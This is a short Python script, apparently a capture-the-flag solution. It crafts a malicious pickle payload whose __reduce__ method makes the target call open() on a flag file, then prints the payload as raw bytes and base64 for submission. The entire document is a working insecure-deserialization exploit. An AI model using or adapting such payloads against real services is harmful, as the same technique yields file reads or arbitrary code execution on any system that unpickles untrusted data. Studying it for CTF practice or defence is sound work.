import pickle, base64, builtins

class Exploit:
    def __reduce__(self):
        # Try reading common flag file locations
        paths = ["flag", "flag.txt", "/flag", "/app/flag", "/home/ctf/flag", "/var/www/flag"]
        return (builtins.open, (paths[0], "r"))

payload = pickle.dumps(Exploit(), protocol=4)

print("Raw bytes:", payload)
print("Base64:", base64.b64encode(payload).decode())
